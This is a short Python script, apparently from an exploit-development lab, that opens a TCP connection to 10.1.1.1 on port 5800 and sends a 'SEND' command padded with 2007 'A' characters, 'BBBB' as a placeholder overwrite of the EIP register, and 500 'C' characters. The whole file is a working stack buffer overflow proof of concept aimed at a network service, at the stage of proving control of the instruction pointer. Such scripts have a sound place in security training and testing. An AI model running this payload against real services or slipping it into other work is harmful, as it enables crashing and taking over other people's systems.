import socket

IP = "10.1.1.1"
PORT = 5800

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

padding = "A" * 2007
eip = "BBBB"
payload = padding + eip + "C" * 500

s.connect((IP, PORT))
print(f"Sending payload...")
s.send(f"SEND {payload} \r\n".encode())
s.recv(1024)